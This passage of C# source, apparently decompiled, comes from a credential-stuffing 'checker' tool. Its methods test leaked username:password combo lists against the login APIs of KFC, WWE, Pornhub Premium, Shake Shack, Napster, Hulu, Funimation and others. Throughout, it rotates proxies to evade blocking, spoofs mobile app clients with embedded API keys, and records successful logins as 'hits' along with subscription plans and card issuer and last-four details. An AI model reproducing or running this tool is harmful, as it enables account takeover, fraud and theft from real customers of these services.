					Colorful.Console.WriteLine("[GOOD] " + text3 + " Balance = " + text9 + " Card = " + text10, Color.Green);
					Combos.Results(text3 + " Balance = " + text9 + " Card = " + text10, "Hits", "Wendy's");
				}
				else if (text6.Contains("403 Forbidden"))
				{
					Variables.ComboList.Add(text3);
					Variables.Retries++;
				}
				else if (text6.Contains("That didn't seem to work.  If you're having trouble logging in, try resetting your password, or if that doesn't work, call customer care"))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
				else if (text6.Contains("Your account was previously locked for your security. To unlock it, please reset your password"))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
				else if (text6.Contains("serviceMessages"))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
				else if (text6.Contains("Please check your inbox for a confirmation email to finish the login process"))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
				else if (text6.Contains("hasPasscode\":true"))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
			}
		}

		public static void startKfc()
		{
			new Random();
			while (Variables.ComboList.Count - 1 > Variables.Index)
			{
				Variables.Index++;
				if (Variables.ComboList[Variables.Index].Split(':').Count() != 2)
				{
					continue;
				}
				string text = Variables.ComboList[Variables.Index].Split(':')[0];
				string text2 = Variables.ComboList[Variables.Index].Split(':')[1];
				string text3 = text + ":" + text2;
				HttpRequest httpRequest = new HttpRequest();
				string a = var.proxyType.ToString().ToUpper();
				string text4 = Checker.var.ProxyList[new Random().Next(Checker.var.ProxyList.Count)];
				if (a == "HTTP")
				{
					httpRequest.Proxy = HttpProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS4")
				{
					httpRequest.Proxy = Socks4ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS5")
				{
					httpRequest.Proxy = Socks5ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				Array array = text4.Split(':');
				if (array.Length == 4)
				{
					string username = (string)((object[])array)[2];
					string password = (string)((object[])array)[3];
					httpRequest.Proxy.Username = username;
					httpRequest.Proxy.Password = password;
				}
				httpRequest.KeepAlive = true;
				httpRequest.IgnoreProtocolErrors = true;
				httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
				httpRequest.AddHeader("Pragma", "no-cache");
				httpRequest.AddHeader("Accept", "*/*");
				httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback, (RemoteCertificateValidationCallback)((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
				string text5 = httpRequest.Get("https://api.thelevelup.com/v15/registration?api_key=hRiuFic1e5MybJFJ8tcUQUwiVkVSHriPXGmqqSPw5DA1UhEm5Yy3TUxwKDWj6QF4&email=" + text).ToString();
				if (text5.Contains("app_name\":\""))
				{
					httpRequest.AddHeader("accept", "application/json");
					httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
					string text6 = httpRequest.Post("https://api.thelevelup.com/v14/access_tokens", "{\"access_token\":{\"username\":\"" + text + "\",\"password\":\"" + text2 + "\",\"api_key\":\"258765411339b8b39abaf90d04dbc5bad363fb3c826f07c4615b5d8ef49afe8c\",\"device_identifier\":\"64e0e1c808899e13c5dac46fccd9cab0b0717725a8436b4e0171a9e72676a2bc\"}}", "application/json").ToString();
					if (text6.Contains("The email address or password you provided is incorrect."))
					{
						if (ShowFails)
						{
							Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
						}
						Checker.Increment_CPM++;
						Variables.Fails++;
						Variables.Progress++;
					}
					else if (text6.Contains(",\"token\":\""))
					{
						string str = Parse(text6, "\"token\":\"", "\",");
						httpRequest.AddHeader("authorization", "token " + str);
						string text7 = httpRequest.Get("https://orderapi.kfc.com/v15/payment_method").ToString();
						if (text7.Contains("You don't have permission to access"))
						{
							Variables.ComboList.Add(text3);
							Variables.Retries++;
							continue;
						}
						string text8 = Parse(text7, "\"issuer\":\"", "\"}");
						string text9 = Parse(text7, "\"last_4\":\"", "\"");
						Colorful.Console.WriteLine("[HIT] " + text3 + " Issuer = " + text8 + " Card Number = " + text9, Color.Green);
						Combos.Results(text3 + " Issuer = " + text8 + " Card Number = " + text9, "Hits", "KFC");
						Variables.Hits++;
						Variables.Progress++;
						Checker.Increment_CPM++;
					}
					else if (text6.Contains("too_many_accounts_on_device"))
					{
						Colorful.Console.WriteLine("[HIT] " + text3 + " TOO MANY DEVICES ON THIS ACCOUNT", Color.Green);
						Combos.Results(text3 + " TOO MANY DEVICES ON THIS ACCOUNT", "Hits", "KFC");
						Variables.Hits++;
						Variables.Progress++;
						Checker.Increment_CPM++;
					}
				}
				else if (text5.Contains("Email not found"))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
				else if (text5.Contains("Forbidden"))
				{
					Variables.ComboList.Add(text3);
					Variables.Retries++;
				}
			}
		}

		public static void startPandora()
		{
		}

		public static void startWwe()
		{
			new Random();
			while (Variables.ComboList.Count - 1 > Variables.Index)
			{
				Variables.Index++;
				if (Variables.ComboList[Variables.Index].Split(':').Count() != 2)
				{
					continue;
				}
				string text = Variables.ComboList[Variables.Index].Split(':')[0];
				string text2 = Variables.ComboList[Variables.Index].Split(':')[1];
				string text3 = text + ":" + text2;
				HttpRequest httpRequest = new HttpRequest();
				string a = var.proxyType.ToString().ToUpper();
				string text4 = Checker.var.ProxyList[new Random().Next(Checker.var.ProxyList.Count)];
				if (a == "HTTP")
				{
					httpRequest.Proxy = HttpProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS4")
				{
					httpRequest.Proxy = Socks4ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS5")
				{
					httpRequest.Proxy = Socks5ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				Array array = text4.Split(':');
				if (array.Length == 4)
				{
					string username = (string)((object[])array)[2];
					string password = (string)((object[])array)[3];
					httpRequest.Proxy.Username = username;
					httpRequest.Proxy.Password = password;
				}
				httpRequest.KeepAlive = true;
				httpRequest.IgnoreProtocolErrors = true;
				httpRequest.AddHeader("Realm", "dce.wwe");
				httpRequest.AddHeader("x-api-key", "ef59c096-d95d-428e-ad94-86385070dde2");
				httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback, (RemoteCertificateValidationCallback)((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
				string text5 = httpRequest.Post("https://dce-frontoffice.imggaming.com/api/v2/login", "{\"id\":\"" + text + "\",\"secret\":\"" + text2 + "\"}", "application/json").ToString();
				if (text5.Contains("authorisationToken"))
				{
					string text6 = Parse(text5, "\"plan\":\"", "\",");
					Colorful.Console.WriteLine("[GOOD] " + text3 + " Plan = " + text6, Color.Green);
					Combos.Results(text3 + " Plan = " + text6, "Hits", "WWE");
					Variables.Hits++;
					Variables.Progress++;
					Checker.Increment_CPM++;
				}
				else if (text5.Contains("failedAuthentication"))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
				else if (text5.Contains("NOT_FOUND"))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
				else if (text5.Contains("403 Forbidden"))
				{
					Variables.ComboList.Add(text3);
					Variables.Retries++;
				}
			}
		}

		public static void startPornhub()
		{
			new Random();
			while (Variables.ComboList.Count - 1 > Variables.Index)
			{
				Variables.Index++;
				if (Variables.ComboList[Variables.Index].Split(':').Count() != 2)
				{
					continue;
				}
				string text = Variables.ComboList[Variables.Index].Split(':')[0];
				string text2 = Variables.ComboList[Variables.Index].Split(':')[1];
				string text3 = text + ":" + text2;
				HttpRequest httpRequest = new HttpRequest();
				string a = var.proxyType.ToString().ToUpper();
				string text4 = Checker.var.ProxyList[new Random().Next(Checker.var.ProxyList.Count)];
				if (a == "HTTP")
				{
					httpRequest.Proxy = HttpProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS4")
				{
					httpRequest.Proxy = Socks4ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS5")
				{
					httpRequest.Proxy = Socks5ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				Array array = text4.Split(':');
				if (array.Length == 4)
				{
					string username = (string)((object[])array)[2];
					string password = (string)((object[])array)[3];
					httpRequest.Proxy.Username = username;
					httpRequest.Proxy.Password = password;
				}
				httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback, (RemoteCertificateValidationCallback)((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
				httpRequest.KeepAlive = true;
				httpRequest.IgnoreProtocolErrors = true;
				httpRequest.Cookies = null;
				httpRequest.AddHeader("Accept", "*/*");
				httpRequest.AddHeader("Pragma", "no-cache");
				httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
				string source = httpRequest.Get("https://www.pornhubpremium.com/premium/login").ToString();
				string text5 = Parse(source, "name=\"token\" value=\"", "\" />");
				httpRequest.ClearAllHeaders();
				httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36");
				httpRequest.AddHeader("Pragma", "no-cache");
				httpRequest.AddHeader("Accept", "*/*");
				httpRequest.AddHeader("Origin", "https://www.pornhubpremium.com");
				httpRequest.AddHeader("Referer", "https://www.pornhubpremium.com/premium/login");
				httpRequest.AddHeader("Sec-Fetch-Mode", "cors");
				httpRequest.AddHeader("Sec-Fetch-Site", "same-origin");
				httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");
				string str = "username=" + text + "&password=" + text2 + "&token=" + text5 + "&redirect=&from=pc_premium_login&segment=straight";
				string text6 = httpRequest.Post("https://www.pornhubpremium.com/front/authenticate", str, "application/x-www-form-urlencoded").ToString();
				if (text6.Contains("{\"success\":\"1\","))
				{
					if (text6.Contains("www.pornhubpremium.com\\/premium_signup?type"))
					{
						Checker.Increment_CPM++;
						Variables.Fails++;
						Variables.Progress++;
						Combos.Results(text3, "Free", "Pornhub");
						Colorful.Console.WriteLine("[FREE] " + text3, Color.Yellow);
					}
					else if (text6.Contains("premium_redirect_cookie\":\"1\""))
					{
						Variables.Hits++;
						Variables.Progress++;
						Checker.Increment_CPM++;
						Colorful.Console.WriteLine("[GOOD] " + text3, Color.Green);
						Combos.Results(text3, "Hits", "Pornhub");
					}
					if (text6.Contains("premium_redirect_cookie\":\"0\""))
					{
						Checker.Increment_CPM++;
						Variables.Fails++;
						Variables.Progress++;
						Combos.Results(text3, "Free", "Pornhub");
						Colorful.Console.WriteLine("[Expired] " + text3, Color.Yellow);
					}
				}
				else if (text6.Contains("Connection: close"))
				{
					Variables.ComboList.Add(text3);
					Variables.Retries++;
				}
				else if (text6.Contains("{\"success\":\"0\""))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
			}
		}

		public static void startShakeShack()
		{
			new Random();
			while (Variables.ComboList.Count - 1 > Variables.Index)
			{
				Variables.Index++;
				if (Variables.ComboList[Variables.Index].Split(':').Count() != 2)
				{
					continue;
				}
				string text = Variables.ComboList[Variables.Index].Split(':')[0];
				string text2 = Variables.ComboList[Variables.Index].Split(':')[1];
				string text3 = text + ":" + text2;
				HttpRequest httpRequest = new HttpRequest();
				string a = var.proxyType.ToString().ToUpper();
				string text4 = Checker.var.ProxyList[new Random().Next(Checker.var.ProxyList.Count)];
				if (a == "HTTP")
				{
					httpRequest.Proxy = HttpProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS4")
				{
					httpRequest.Proxy = Socks4ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS5")
				{
					httpRequest.Proxy = Socks5ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				Array array = text4.Split(':');
				if (array.Length == 4)
				{
					string username = (string)((object[])array)[2];
					string password = (string)((object[])array)[3];
					httpRequest.Proxy.Username = username;
					httpRequest.Proxy.Password = password;
				}
				httpRequest.KeepAlive = true;
				httpRequest.IgnoreProtocolErrors = true;
				httpRequest.Cookies = null;
				httpRequest.UserAgent = "okhttp/3.13.1)";
				httpRequest.AddHeader("Platform-OS", "android");
				httpRequest.AddHeader("Platform-Package", "com.shakeshack.android");
				httpRequest.AddHeader("Platform-Spec", "1");
				httpRequest.AddHeader("Platform-Format", "handset");
				httpRequest.AddHeader("Platform-Version", "1.6.0");
				httpRequest.AddHeader("Accept", "application/json");
				httpRequest.AddHeader("Authorization", "Basic VDQ1VTUxNVB0QjI1QWFJdU1qdVZhUG0yUFRJQkhhZFlOVklScUU5Szp1V2hoN2xUQ0RYdVFURXVWZG9HZWN0RWhMamxMWU5GOW9Bd3MwdEY4QmlMdG5TdFdSU05RWHpORWFtQlZMTnNuajdnRW5sSEJxdzNldm9taVVqTUMyQ1hLc3JidDdSUVFqMnR5dTlXekNCS1JGNE05d21WZEROUWN6eGRjQkVKeQ==");
				httpRequest.AddHeader("User-Agent", "okhttp/3.13.1");
				httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback, (RemoteCertificateValidationCallback)((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
				string text5 = httpRequest.Post("https://ssma24.com/oauth/token/", "username=" + text + "&password=" + text2 + "&grant_type=password", "application/x-www-form-urlencoded").ToString();
				if (text5.Contains("{\"access_token"))
				{
					Variables.Hits++;
					Variables.Progress++;
					Checker.Increment_CPM++;
					Colorful.Console.WriteLine("[GOOD] " + text3, Color.Green);
					Combos.Results(text3, "Hits", "Shake Shack");
				}
				else if (text5.Contains("403 ERROR"))
				{
					Variables.ComboList.Add(text3);
					Variables.Retries++;
				}
				else if (text5.Contains("The username or password you have entered was invalid"))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
			}
		}

		public static void startNapster()
		{
			new Random();
			while (Variables.ComboList.Count - 1 > Variables.Index)
			{
				Variables.Index++;
				if (Variables.ComboList[Variables.Index].Split(':').Count() != 2)
				{
					continue;
				}
				string text = Variables.ComboList[Variables.Index].Split(':')[0];
				string text2 = Variables.ComboList[Variables.Index].Split(':')[1];
				string text3 = text + ":" + text2;
				HttpRequest httpRequest = new HttpRequest();
				string a = var.proxyType.ToString().ToUpper();
				string text4 = Checker.var.ProxyList[new Random().Next(Checker.var.ProxyList.Count)];
				if (a == "HTTP")
				{
					httpRequest.Proxy = HttpProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS4")
				{
					httpRequest.Proxy = Socks4ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS5")
				{
					httpRequest.Proxy = Socks5ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				Array array = text4.Split(':');
				if (array.Length == 4)
				{
					string username = (string)((object[])array)[2];
					string password = (string)((object[])array)[3];
					httpRequest.Proxy.Username = username;
					httpRequest.Proxy.Password = password;
				}
				httpRequest.KeepAlive = true;
				httpRequest.IgnoreProtocolErrors = true;
				httpRequest.AddHeader("Authorization", "Basic WkRVMU1ETXpNekl0WlRNd055MDBZVGhpTFRobFltUXRaV1V3TmpCaVpUSmpORFptOk4yRTJaR1U0WWpJdE56STJNaTAwWVRoaUxXSTRPRFl0WW1FeU5EQXhaamt3TWpZdw==");
				httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback, (RemoteCertificateValidationCallback)((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
				string text5 = httpRequest.Post("https://api-web.napster.com/oauth/token", "username=" + text + "&password=" + text2 + "&grant_type=password", "  application/x-www-form-urlencoded").ToString();
				if (text5.Contains("access_token"))
				{
					string str = Parse(text5, "access_token\":\"", "\"");
					httpRequest.AddHeader("Authorization", "Bearer " + str);
					string text6 = httpRequest.Get("https://api-web.napster.com/me/account?napiAccessToken=" + str + "&rights=2").ToString();
					if (text6.Contains("\"subscription\":{\"id\":\"\""))
					{
						Colorful.Console.WriteLine("[FREE] " + text3, Color.Yellow);
						Combos.Results(text3, "Free", "Napster");
						Variables.Fails++;
						Variables.Progress++;
						Checker.Increment_CPM++;
					}
					else if (text6.Contains("state\":\"EXPIRED"))
					{
						if (ShowFails)
						{
							Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
						}
						Checker.Increment_CPM++;
						Variables.Fails++;
						Variables.Progress++;
					}
					else
					{
						string text7 = Parse(text6, "productName\":\"", "\"");
						Colorful.Console.WriteLine("[GOOD] " + text3 + " Plan = " + text7, Color.Green);
						Combos.Results(text3 + " | Plan = " + text7, "Hits", "Napster");
						Variables.Hits++;
						Variables.Progress++;
						Checker.Increment_CPM++;
					}
				}
				else if (text5.Contains("Invalid password"))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
				else if (text5.Contains("No user found for"))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
				else if (text5.Contains("406 Not Acceptable"))
				{
					Variables.ComboList.Add(text3);
					Variables.Retries++;
				}
				else if (text5.Contains("Too many failed login attempts"))
				{
					Variables.ComboList.Add(text3);
					Variables.Retries++;
				}
			}
		}

		public static void startOrigin()
		{
			origin.originStart();
		}

		public static void startHulu()
		{
			new Random();
			while (Variables.ComboList.Count - 1 > Variables.Index)
			{
				Variables.Index++;
				if (Variables.ComboList[Variables.Index].Split(':').Count() != 2)
				{
					continue;
				}
				string text = Variables.ComboList[Variables.Index].Split(':')[0];
				string text2 = Variables.ComboList[Variables.Index].Split(':')[1];
				string text3 = text + ":" + text2;
				HttpRequest httpRequest = new HttpRequest();
				string a = var.proxyType.ToString().ToUpper();
				string text4 = Checker.var.ProxyList[new Random().Next(Checker.var.ProxyList.Count)];
				if (a == "HTTP")
				{
					httpRequest.Proxy = HttpProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS4")
				{
					httpRequest.Proxy = Socks4ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS5")
				{
					httpRequest.Proxy = Socks5ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				Array array = text4.Split(':');
				if (array.Length == 4)
				{
					string username = (string)((object[])array)[2];
					string password = (string)((object[])array)[3];
					httpRequest.Proxy.Username = username;
					httpRequest.Proxy.Password = password;
				}
				httpRequest.KeepAlive = true;
				httpRequest.IgnoreProtocolErrors = true;
				httpRequest.Cookies = null;
				httpRequest.AddHeader("X-Hulu-User-Agent", "androidv3/4.0.0.408770/98ded0155cef8123;OS_22,MODEL_SM-G930L");
				httpRequest.AddHeader("User-Agent", "Hulu/4.0.0.408770 (Android 5.1.1; en_US; SM-G930L; Build/NRD90M;)");
				httpRequest.UserAgent = "Hulu/4.0.0.408770 (Android 5.1.1; en_US; SM-G930L; Build/NRD90M;)";
				string str = "user_email=" + text + "&password=" + text2 + "&serial_number=98ded0155cef8123&friendly_name=Android%20-%20samsung%20SM-G930L%20samsung&mobile_capabilities=telephony&additional_properties=%7B%22distro%22%3A%22google%22%2C%22device_platform%22%3A%22Android%22%2C%22device_type%22%3A%22Tablet%22%2C%22app_version%22%3A%224.0.0%22%2C%22device_family%22%3A%22Android%22%2C%22build_number%22%3A%22408770%22%2C%22device_os%22%3A%22Android%20REL5.1.1%22%2C%22device_manufacturer%22%3A%22samsung%22%2C%22device_product%22%3A%22Android%20REL5.1.1%22%2C%22device_model%22%3A%22SM-G930L%22%2C%22device_capabilities%22%3A%7B%22device%22%3A%7B%22hulu%3Aapp%3Aandroid%22%3A%224.0.0%22%2C%22hulu%3Aplatform%3Aandroid%3Agoogleplay%22%3A%2222%22%2C%22hulu%3Adevices%3Asamsung%3Asmg930l%22%3A%22%22%7D%7D%7D&device_id=166&time_zone=Asia%2FTehran&screen_size=%7B%22width_pixels%22%3A960%2C%22height_pixels%22%3A540%2C%22width_pixel_density_in_inches%22%3A160%2C%22height_pixel_density_in_inches%22%3A160%7D";
				httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback, (RemoteCertificateValidationCallback)((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
				string text5 = httpRequest.Post("https://auth.hulu.com/v1/device/password/authenticate", str, "application/x-www-form-urlencoded").ToString();
				if (text5.Contains("device_token"))
				{
					string str2 = Parse(text5, "\"user_token\":\"", "\",\"e");
					string address = "https://home.hulu.com/v1/users/self?action=login&user_token=" + str2;
					string text6 = httpRequest.Get(address).ToString();
					if (text6.Contains("262144"))
					{
						Colorful.Console.WriteLine("[FREE] " + text3, Color.YellowGreen);
						Combos.Results(text3, "Free", "Hulu");
						Variables.Progress++;
						Checker.Increment_CPM++;
						continue;
					}
					Variables.Hits++;
					Variables.Progress++;
					Checker.Increment_CPM++;
					if (text6.Contains("66536"))
					{
						Colorful.Console.WriteLine("[GOOD] " + text3 + " Plan = Hulu with ads", Color.DarkGreen);
						Combos.Results(text3 + " Plan = Hulu with ads", "Hits", "Hulu");
					}
					else if (text6.Contains("197608"))
					{
						Colorful.Console.WriteLine("[GOOD] " + text3 + " Plan = Hulu (No Ads)", Color.DarkGreen);
						Combos.Results(text3 + " Plan = Hulu (No Ads)", "Hits", "Hulu");
					}
					else if (text6.Contains("459752"))
					{
						Colorful.Console.WriteLine("[GOOD] " + text3 + " Plan = Hulu (No Ads) + Showtime", Color.DarkGreen);
						Combos.Results(text3 + " Plan = Hulu (No Ads) + Showtime", "Hits", "Hulu");
					}
					else if (text6.Contains("1311769576"))
					{
						Colorful.Console.WriteLine("[GOOD] " + text3 + " Plan = Hulu (No Ads) + Live TV, Enhanced Cloud DVR + Unlimited Screens Bundle, STARZ®", Color.DarkGreen);
						Combos.Results(text3 + " Plan = Hulu (No Ads) + Live TV, Enhanced Cloud DVR + Unlimited Screens Bundle, STARZ", "Hits", "Hulu");
					}
					else if (text6.Contains("1049576"))
					{
						Colorful.Console.WriteLine("[GOOD] " + text3 + " Plan = Hulu + Live TV + HBO + CINEMAX", Color.DarkGreen);
						Combos.Results(text3 + " Plan = Hulu + Live TV + HBO + CINEMAX", "Hits", "Hulu");
					}
					else if (text6.Contains("200356"))
					{
						Colorful.Console.WriteLine("[GOOD] " + text3 + " Plan = Hulu (No Ads) Free Trial", Color.DarkGreen);
						Combos.Results(text3 + " Hulu (No Ads) Free Trial", "Hits", "Hulu");
					}
					else if (text6.Contains("70125"))
					{
						Colorful.Console.WriteLine("[GOOD] " + text3 + " Plan = Hulu + CINEMAX", Color.DarkGreen);
						Combos.Results(text3 + " Plan = Hulu + CINEMAX", "Hits", "Hulu");
					}
					else
					{
						Colorful.Console.WriteLine("[GOOD] " + text3 + " Plan = Unknow", Color.DarkGreen);
						Combos.Results(text3 + " Plan = Unknow", "Hits", "Hulu");
					}
				}
				else if (text5.Contains("Connection: close"))
				{
					Variables.ComboList.Add(text3);
					Variables.Retries++;
				}
				else if (text5.Contains("{\"message\":\"Your login is invalid. Please try again.\"}"))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
			}
		}

		public static void startFunimation()
		{
			new Random();
			while (Variables.ComboList.Count - 1 > Variables.Index)
			{
				Variables.Index++;
				if (Variables.ComboList[Variables.Index].Split(':').Count() != 2)
				{
					continue;
				}
				string text = Variables.ComboList[Variables.Index].Split(':')[0];
				string text2 = Variables.ComboList[Variables.Index].Split(':')[1];
				string text3 = text + ":" + text2;
				HttpRequest httpRequest = new HttpRequest();
				string a = var.proxyType.ToString().ToUpper();
				string text4 = Checker.var.ProxyList[new Random().Next(Checker.var.ProxyList.Count)];
				if (a == "HTTP")
				{
					httpRequest.Proxy = HttpProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS4")
				{
					httpRequest.Proxy = Socks4ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS5")
				{
					httpRequest.Proxy = Socks5ProxyClient.Parse(text4);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				Array array = text4.Split(':');
				if (array.Length == 4)
				{
					string username = (string)((object[])array)[2];
					string password = (string)((object[])array)[3];
					httpRequest.Proxy.Username = username;
					httpRequest.Proxy.Password = password;
				}
				httpRequest.KeepAlive = true;
				httpRequest.IgnoreProtocolErrors = true;
				httpRequest.Cookies = null;
				httpRequest.AddHeader("Accept", "*/*");
				httpRequest.AddHeader("Pragma", "no-cache");
				httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
				httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback, (RemoteCertificateValidationCallback)((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
				string text5 = httpRequest.Post("https://prod-api-funimationnow.dadcdigital.com/api/auth/login/", "username=" + text + "&password=" + text2, "application/x-www-form-urlencoded").ToString();
				if (text5.Contains("{\"token\":\""))
				{
					string text6 = Parse(text5, "user_region\":\"", "\"}");
					string text7 = Parse(text5, "en:web:us_", "\",");
					if (text7.Contains("free"))
					{
						Checker.Increment_CPM++;
						Variables.Fails++;
						Variables.Progress++;
						Combos.Results(text3, "Free", "Funimation");
						Colorful.Console.WriteLine("[FREE] " + text3, Color.Yellow);
					}
					else if (text5.Contains("premium"))
					{
						Variables.Hits++;
						Variables.Progress++;
						Checker.Increment_CPM++;
						Colorful.Console.WriteLine("[GOOD] " + text3 + " Country = " + text6 + " Subscription = " + text7, Color.Green);
						Combos.Results(text3 + " Country = " + text6 + " Subscription = " + text7, "Hits", "Funimation");
					}
				}
				else if (text5.Contains("log in to your account at this time. Please try again later"))
				{
					Variables.ComboList.Add(text3);
					Variables.Retries++;
				}
				else if (text5.Contains("Failed Authentication"))
				{
					if (ShowFails)
					{
						Colorful.Console.WriteLine("[Bad] " + text3, Color.Red);
					}
					Checker.Increment_CPM++;
					Variables.Fails++;
					Variables.Progress++;
				}
			}
		}

		public static void startUplay()
		{
			new Random();
			while (Variables.ComboList.Count - 1 > Variables.Index)
			{
				Variables.Index++;
				if (Variables.ComboList[Variables.Index].Split(':').Count() != 2)
				{
					continue;
				}
				string str = Variables.ComboList[Variables.Index].Split(':')[0];
				string str2 = Variables.ComboList[Variables.Index].Split(':')[1];
				string text = str + ":" + str2;
				HttpRequest httpRequest = new HttpRequest();
				string a = var.proxyType.ToString().ToUpper();
				string text2 = Checker.var.ProxyList[new Random().Next(Checker.var.ProxyList.Count)];
				if (a == "HTTP")
				{
					httpRequest.Proxy = HttpProxyClient.Parse(text2);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS4")
				{
					httpRequest.Proxy = Socks4ProxyClient.Parse(text2);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				if (a == "SOCKS5")
				{
					httpRequest.Proxy = Socks5ProxyClient.Parse(text2);
					httpRequest.Proxy.ConnectTimeout = 5000;
				}
				Array array = text2.Split(':');
				if (array.Length == 4)
				{
					string username = (string)((object[])array)[2];
					string password = (string)((object[])array)[3];
					httpRequest.Proxy.Username = username;
					httpRequest.Proxy.Password = password;
				}
				string str3 = Base64Encode(text);
